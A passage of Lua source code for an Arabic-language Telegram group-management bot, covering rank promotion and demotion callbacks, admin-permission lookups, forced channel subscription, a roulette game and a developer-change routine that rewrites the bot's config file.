Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙عذࢪاَ "..WAAD.." ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "Reply" then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙العضو ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "ReplyBy" then
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙بواسطة ↫ ["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
if status == "EbDsDrg" then
local WAAD = {"حبيبي","؏َـمࢪي","عزيزي","يڪلبي","روحي","حب","حــچي","ضلعي"} 
local WAAD = WAAD[math.random(#WAAD)]
local Hello = {"ﭑهـلاً","هيلآو","هايـہ","يهلۿ`","مࢪحبا"} 
local welcom = Hello[math.random(#Hello)]
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙"..welcom.." "..WAAD.."↫ ["..IdRank(msg.sender_user_id_,msg.chat_id_).."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙الحساب محذوف قم بالتاكد واعد المحاوله", 1, 'md')
end
end,nil)   
end
--     Source WAAD     --
function GetCustomTitle(user_id,chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..chat_id..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then 
Status = "المالك"
elseif GetInfo.result.status == "administrator" then 
Status = "مشرف"
else
Status = false
end
if GetInfo.result.custom_title then 
AIAN = GetInfo.result.custom_title
else 
AIAN = Status
end
end
return AIAN
end
function Validity(msg,user_id) 
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then
send(msg.chat_id_,msg.id_,'⌯︙مالك المجموعه')   
return false  end 
if GetInfo.result.status == "member" then
send(msg.chat_id_,msg.id_,'⌯︙مجرد عضو هنا')   
return false  end
if GetInfo.result.status == 'left' then
send(msg.chat_id_,msg.id_,'⌯︙الشخص غير موجود هنا')   
return false  end
if GetInfo.result.status == "administrator" then
if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
if GetInfo.result.can_delete_messages == true then DEL = '✔️' else DEL = '✖️' end
if GetInfo.result.can_invite_users == true then INV = '✔️' else INV = '✖️' end
if GetInfo.result.can_pin_messages == true then PIN = '✔️' else PIN = '✖️' end
if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
send(msg.chat_id_,msg.id_,'⌯︙صلاحيات '..GetCustomTitle(user_id,msg.chat_id_)..' هي ↫ ⤈\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙حذف الرسائل ↫ '..DEL..'\n⌯︙دعوة المستخدمين ↫ '..INV..'\n⌯︙حظر المستخدمين ↫ '..BAN..'\n⌯︙تثبيت الرسائل ↫ '..PIN..'\n⌯︙تغيير المعلومات ↫ '..EDT..'\n⌯︙اضافة مشرفين ↫ '..VIP..'\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ')
end
end
end
--     Source WAAD     --
function GetBio(chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..chat_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.bio then 
AIAN = GetInfo.result.bio
else 
AIAN = "لا يوجد"
end
end
return AIAN
end
--     Source WAAD     --
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({ ID = request_id, chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = input_message_content }, callback or dl_cb, extra)
end
local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = { ID = "InputMessageDocument", document_ = getInputFile(document), caption_ = caption } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageVoice", voice_ = getInputFile(voice), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendAudio(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, audio, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageAudio", audio_ = getInputFile(audio), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = { ID = "InputMessageSticker", sticker_ = getInputFile(sticker), width_ = 0, height_ = 0 } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end 
function formsgs(msgs) 
local MsgText = ''  
if tonumber(msgs) < 100 then 
MsgText = 'جدا ضعيف' 
elseif tonumber(msgs) < 250 then 
MsgText = 'ضعيف' 
elseif tonumber(msgs) < 500 then 
MsgText = 'غير متفاعل' 
elseif tonumber(msgs) < 750 then 
MsgText = 'متوسط' 
elseif tonumber(msgs) < 1000 then 
MsgText = 'متفاعل' 
elseif tonumber(msgs) < 2000 then 
MsgText = 'قمة التفاعل' 
elseif tonumber(msgs) < 3000 then 
MsgText = 'ملك التفاعل'  
elseif tonumber(msgs) < 4000 then 
MsgText = 'اسطورة التفاعل' 
elseif tonumber(msgs) < 5000 then 
MsgText = 'متفاعل نار' 
elseif tonumber(msgs) < 6000 then 
MsgText = 'يجدح جدح' 
elseif tonumber(msgs) < 7000 then 
MsgText = 'خيالي' 
elseif tonumber(msgs) < 8000 then 
MsgText = 'رب التفاعل' 
elseif tonumber(msgs) < 9000 then 
MsgText = 'كافر بالتفاعل' 
elseif tonumber(msgs) < 10000000000 then 
MsgText = "معلك لربك" 
end 
return MsgText
end
--     Source WAAD     --
function AIANmoned(chat_id, user_id, msg_id, text, offset, length) tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source WAAD     --
function ChCheck(msg)
local var = true 
if DevAIAN:get(WAAD.."AIAN:ChId") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevAIAN:get(WAAD..'AIAN:ChId')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevAIAN:get(WAAD..'AIAN:ChText') then
local ChText = DevAIAN:get(WAAD..'AIAN:ChText')
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevAIAN:get(WAAD.."AIAN:ChId"))
local GetInfo = JSON.decode(Check)
User = "https://t.me/"..GetInfo.result.username
local inline = {{{text=GetInfo.result.title,url=User}}}
Msg_id = msg.id_/2097152/0.5
SendInline(msg.chat_id_,'['..ChText..']',nil,inline,Msg_id)
else
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevAIAN:get(WAAD.."AIAN:ChId"))
local GetInfo = JSON.decode(Check)
if GetInfo.result.username then
User = "https://t.me/"..GetInfo.result.username
else
User = GetInfo.result.invite_link
end
local WAAD = {"حبيبي","؏َـمࢪي","عزيزي","يڪلبي","روحي","حب","حــچي","ضلعي"} 
local WAAD = WAAD[math.random(#WAAD)]
local Text = '⌯︙عذࢪاَ '..WAAD..' ↫  ['..data.first_name_..'](tg://user?id='..data.id_..')\n⌯︙عـليك الاشـتࢪاك في قنـاة البـوت اولآ\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ'
keyboard = {} 
keyboard.inline_keyboard = {{{text=GetInfo.result.title,url=User}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil) 
end
elseif data.ok then
return var
end
else
return var
end
end
function tdcli_update_callback(data)
if (data.ID == "UpdateNewCallbackQuery") then
local Chat_Id2 = data.chat_id_
local MsgId2 = data.message_id_
local DataText = data.payload_.data_
local Msg_Id2 = data.message_id_/2097152/0.5
if DataText == '/delyes' and DevAIAN:get(WAAD..'yes'..data.sender_user_id_) == 'delyes' then
DevAIAN:del(WAAD..'yes'..data.sender_user_id_, 'delyes')
DevAIAN:del(WAAD..'no'..data.sender_user_id_, 'delno')
if RankChecking(data.sender_user_id_, data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "⌯︙لا استطيع طرد ↫ "..IdRank(data.sender_user_id_, data.chat_id_)) 
return false
end
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=data.chat_id_,user_id_=data.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,da) 
if (da and da.code_ and da.code_ == 400 and da.message_ == "CHAT_ADMIN_REQUIRED") then 
EditMsg(Chat_Id2, Msg_Id2, "⌯︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if (da and da.code_ and da.code_ == 3) then 
EditMsg(Chat_Id2, Msg_Id2, "⌯︙البوت ليس ادمن يرجى ترقيتي !") 
return false  
end
if da and da.code_ and da.code_ == 400 and da.message_ == "USER_ADMIN_INVALID" then 
EditMsg(Chat_Id2, Msg_Id2, "⌯︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
if da and da.ID and da.ID == "Ok" then
ChatKick(data.chat_id_, data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "⌯︙تم طردك من المجموعه") 
return false
end
end,nil)  
end
if DataText == '/delno' and DevAIAN:get(WAAD..'no'..data.sender_user_id_) == 'delno' then
DevAIAN:del(WAAD..'yes'..data.sender_user_id_, 'delyes')
DevAIAN:del(WAAD..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "⌯︙تم الغاء امر اطردني") 
end
--     Source WAAD     --
if DataText == '/yesdel' and DevAIAN:get(WAAD..'yesdel'..data.sender_user_id_) == 'delyes' then
DevAIAN:del(WAAD..'yesdel'..data.sender_user_id_, 'delyes')
DevAIAN:del(WAAD..'nodel'..data.sender_user_id_, 'delno')
if DevAIAN:sismember(WAAD..'AIAN:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevAIAN:sismember(WAAD..'AIAN:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'المدراء • ' else Managers = '' end
if DevAIAN:sismember(WAAD..'AIAN:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevAIAN:sismember(WAAD..'AIAN:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevAIAN:sismember(WAAD..'AIAN:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = '' end
if DevAIAN:sismember(WAAD..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'المطايه • ' else donky = '' end
if DevAIAN:sismember(WAAD..'User:HaTa:'..data.chat_id_, data.sender_user_id_) then
HaTa = 'الحاتات • ' else HaTa = '' end
if DevAIAN:sismember(WAAD..'User:hlo:'..data.chat_id_, data.sender_user_id_) then
hlo = 'الصاكين • ' else hlo = '' end
if DevAIAN:sismember(WAAD..'User:Sakl:'..data.chat_id_, data.sender_user_id_) then
Sakl = 'الصخوله • ' else Sakl = '' end
if DevAIAN:sismember(WAAD..'User:Dog:'..data.chat_id_, data.sender_user_id_) then
Dog = 'الجلاب • ' else Dog = '' end
if DevAIAN:sismember(WAAD..'User:Monkey:'..data.chat_id_, data.sender_user_id_) then
Monkey = 'القورده • ' else Monkey = '' end
if DevAIAN:sismember(WAAD..'User:Bakra:'..data.chat_id_, data.sender_user_id_) then
Bakra = 'البقرات • ' else Bakra = '' end
if DevAIAN:sismember(WAAD..'User:Tale:'..data.chat_id_, data.sender_user_id_) then
Tale = 'الطليان • ' else Tale = '' end
if DevAIAN:sismember(WAAD..'User:Zahf:'..data.chat_id_, data.sender_user_id_) then
Zahf = 'الزواحف • ' else Zahf = '' end
if DevAIAN:sismember(WAAD..'User:Jred:'..data.chat_id_, data.sender_user_id_) then
Jred = 'الجريذيه • ' else Jred = '' end
if DevAIAN:sismember(WAAD..'User:Bro:'..data.chat_id_, data.sender_user_id_) then
Bro = 'الضلوع • ' else Bro = '' end
if DevAIAN:sismember(WAAD..'User:Bro:Girl'..data.chat_id_, data.sender_user_id_) then
Girl = 'الضلعات • ' else Girl = '' end
if DevAIAN:sismember(WAAD..'AIAN:Constructor:'..data.chat_id_, data.sender_user_id_) or DevAIAN:sismember(WAAD..'AIAN:Managers:'..data.chat_id_, data.sender_user_id_) or DevAIAN:sismember(WAAD..'AIAN:Admins:'..data.chat_id_, data.sender_user_id_) or DevAIAN:sismember(WAAD..'AIAN:VipMem:'..data.chat_id_, data.sender_user_id_) or DevAIAN:sismember(WAAD..'AIAN:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevAIAN:sismember(WAAD..'User:Donky:'..data.chat_id_, data.sender_user_id_) or DevAIAN:sismember(WAAD..'User:HaTa:'..data.chat_id_, data.sender_user_id_)or DevAIAN:sismember(WAAD..'User:hlo:'..data.chat_id_, data.sender_user_id_)or DevAIAN:sismember(WAAD..'User:Sakl:'..data.chat_id_, data.sender_user_id_)or DevAIAN:sismember(WAAD..'User:Dog:'..data.chat_id_, data.sender_user_id_)or DevAIAN:sismember(WAAD..'User:Monkey:'..data.chat_id_, data.sender_user_id_)or DevAIAN:sismember(WAAD..'User:Bakra:'..data.chat_id_, data.sender_user_id_)or DevAIAN:sismember(WAAD..'User:Tale:'..data.chat_id_, data.sender_user_id_)or DevAIAN:sismember(WAAD..'User:Zahf:'..data.chat_id_, data.sender_user_id_)or DevAIAN:sismember(WAAD..'User:Jred:'..data.chat_id_, data.sender_user_id_)or DevAIAN:sismember(WAAD..'User:Bro:'..data.chat_id_, data.sender_user_id_)or DevAIAN:sismember(WAAD..'User:Bro:Girl'..data.chat_id_, data.sender_user_id_) then
DevAIAN:srem(WAAD..'AIAN:Constructor:'..data.chat_id_,data.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Managers:'..data.chat_id_,data.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Admins:'..data.chat_id_,data.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:VipMem:'..data.chat_id_,data.sender_user_id_)
DevAIAN:srem(WAAD..'AIAN:Cleaner:'..data.chat_id_,data.sender_user_id_)
DevAIAN:srem(WAAD..'User:Donky:'..data.chat_id_,data.sender_user_id_)
DevAIAN:srem(WAAD..'User:HaTa:'..data.chat_id_,data.sender_user_id_)
DevAIAN:srem(WAAD..'User:hlo:'..data.chat_id_,data.sender_user_id_)
DevAIAN:srem(WAAD..'User:Sakl:'..data.chat_id_,data.sender_user_id_)
DevAIAN:srem(WAAD..'User:Dog:'..data.chat_id_,data.sender_user_id_)
DevAIAN:srem(WAAD..'User:Monkey:'..data.chat_id_,data.sender_user_id_)
DevAIAN:srem(WAAD..'User:Bakra:'..data.chat_id_,data.sender_user_id_)
DevAIAN:srem(WAAD..'User:Tale:'..data.chat_id_,data.sender_user_id_)
DevAIAN:srem(WAAD..'User:Zahf:'..data.chat_id_,data.sender_user_id_)
DevAIAN:srem(WAAD..'User:Jred:'..data.chat_id_,data.sender_user_id_)
DevAIAN:srem(WAAD..'User:Bro:'..data.chat_id_,data.sender_user_id_)
DevAIAN:srem(WAAD..'User:Bro:Girl'..data.chat_id_,data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "⌯︙تم تنزيلك من ↫ ⤈\n~ ( "..constructor..''..Managers..''..admins..''..vipmem..''..cleaner..''..donky..''..HaTa..''..hlo..''..Sakl..''..Dog..''..Monkey..''..Bakra..''..Tale..''..Zahf..''..Jred..''..Bro..''..Girl..") ~ \n") 
else 
if IdRank(data.sender_user_id_, data.chat_id_) == 'العضو' then
EditMsg(Chat_Id2, Msg_Id2, "⌯︙ليس لديك رتبه في البوت") 
else 
EditMsg(Chat_Id2, Msg_Id2, "⌯︙لا استطيع تنزيل ↫ "..IdRank(data.sender_user_id_, data.chat_id_)) 
end
end
end
if DevAIAN:get(WAAD.."AIAN:NewDev"..data.sender_user_id_) then
if DataText == '/setno' then
EditMsg(Chat_Id2, Msg_Id2, "⌯︙تم الغاء امر تغير المطور الاساسي") 
DevAIAN:del(WAAD.."AIAN:NewDev"..data.sender_user_id_)
return false
end
if DataText == '/setyes' then
local NewDev = DevAIAN:get(WAAD.."AIAN:NewDev"..data.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = NewDev},function(arg,dp) 
EditMsg(Chat_Id2, Msg_Id2, "⌯︙المطور الجديد ↫ ["..dp.first_name_.."](tg://user?id="..dp.id_..")\n⌯︙تم تغير المطور الاساسي بنجاح") 
end,nil)
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,dp) 
SendText(NewDev,"⌯︙بواسطة ↫ ["..dp.first_name_.."](tg://user?id="..dp.id_..")\n⌯︙لقد اصبحت انت مطور هذا البوت",0,'md')
end,nil)
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
Config = {
WAAD = NewDev,
TokenBot = TokenBot,
WAAD = TokenBot:match("(%d+)"),
SudoIds = {NewDev},
}
Create(Config, "./config.lua")  
DevAIAN:del(WAAD.."AIAN:NewDev"..data.sender_user_id_)
dofile('WAAD.lua') 
end
end
if DataText == '/nodel' and DevAIAN:get(WAAD..'nodel'..data.sender_user_id_) == 'delno' then
DevAIAN:del(WAAD..'yesdel'..data.sender_user_id_, 'delyes')
DevAIAN:del(WAAD..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "⌯︙تم الغاء امر نزلني") 
end
if DataText == '/YesRolet' and DevAIAN:get(WAAD.."AIAN:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local List = DevAIAN:smembers(WAAD..'AIAN:ListRolet'..data.chat_id_) 
local UserName = List[math.random(#List)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
DevAIAN:incrby(WAAD..'AIAN:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
DevAIAN:del(WAAD..'AIAN:ListRolet'..data.chat_id_) 
DevAIAN:del(WAAD.."AIAN:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "⌯︙*صاحب الحظ* ↫ ["..UserName.."]\n⌯︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
end
if DataText == '/NoRolet' then
DevAIAN:del(WAAD..'AIAN:ListRolet'..data.chat_id_) 
DevAIAN:del(WAAD.."AIAN:NumRolet"..data.chat_id_..data.sender_user_id_) 
DevAIAN:del(WAAD.."AIAN:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "⌯︙تم الغاء اللعبه لاعادة اللعب ارسل الالعاب") 
end
if DataText == '/ListRolet' then
local List = DevAIAN:smembers(WAAD..'AIAN:ListRolet'..data.chat_id_) 
local Text = '⌯︙قائمة الاعبين ↫ ⤈\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n' 
local Textt = 'ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n⌯︙تم اكتمال العدد الكلي هل انت مستعد ؟'
for k, v in pairs(List) do 
Text = Text..k.."~ : [" ..v.."]\n"  
end 
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="لا",callback_data="/NoRolet"}}} 
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text..Textt).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText == '/UnTkeed' then
if DevAIAN:sismember(WAAD..'AIAN:Tkeed:'..Chat_Id2, data.sender_user_id_) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..Chat_Id2.."&user_id="..data.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevAIAN:srem(WAAD..'AIAN:Tkeed:'..Chat_Id2, data.sender_user_id_)
DeleteMessage(Chat_Id2,{[0] = MsgId2})
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌯ تم الغاء تقيدك من المجموعه بنجاح .")..'&show_alert=true')
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌯ عذرا هذا الامر لكشف الروبوت وليس لك .")..'&show_alert=true')
end 
end
if DataText and DataText:match(tonumber(data.sender_user_id_)..':SetMem:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':SetMem:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
DevAIAN:sadd(WAAD..'AIAN:VipMem:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم رفعه في قائمة المميزين')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetCleaner:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':SetCleaner:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
DevAIAN:sadd(WAAD..'AIAN:Cleaner:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم رفعه في قائمة المنظفين')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetAdmin:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':SetAdmin:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
DevAIAN:sadd(WAAD..'AIAN:Admins:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم رفعه في قائمة الادمنيه')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetManager:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':SetManager:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
DevAIAN:sadd(WAAD..'AIAN:Managers:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم رفعه في قائمة المدراء')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetConstructor:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':SetConstructor:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
DevAIAN:sadd(WAAD..'AIAN:Constructor:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم رفعه في قائمة المنشئين')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetBasicConstructor:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':SetBasicConstructor:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
DevAIAN:sadd(WAAD..'AIAN:BasicConstructor:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم رفعه في قائمة المنشئين الاساسيين')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetAIANConstructor:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':SetAIANConstructor:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
DevAIAN:sadd(WAAD..'AIAN:AIANConstructor:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم رفعه في قائمة المالكين')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetSudoBot:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':SetSudoBot:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
DevAIAN:sadd(WAAD..'AIAN:SudoBot:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم رفعه في قائمة المطورين')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetSecondSudo:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':SetSecondSudo:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
DevAIAN:sadd(WAAD..'AIAN:SecondSudo:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم رفعه في قائمة المطورين الثانويين')
end,nil)
end
if DataText and DataText:match(tonumber(data.sender_user_id_)..':RemMem:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':RemMem:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
DevAIAN:srem(WAAD..'AIAN:VipMem:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم تنزيله من قائمة المميزين')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemCleaner:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':RemCleaner:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
DevAIAN:srem(WAAD..'AIAN:Cleaner:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم تنزيله من قائمة المنظفين')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemAdmin:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':RemAdmin:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
DevAIAN:srem(WAAD..'AIAN:Admins:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم تنزيله من قائمة الادمنيه')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemManager:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':RemManager:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
DevAIAN:srem(WAAD..'AIAN:Managers:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم تنزيله من قائمة المدراء')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemConstructor:(.*)') then
local AIANId = DataText:match(tonumber(data.sender_user_id_)..':RemConstructor:(.*)')
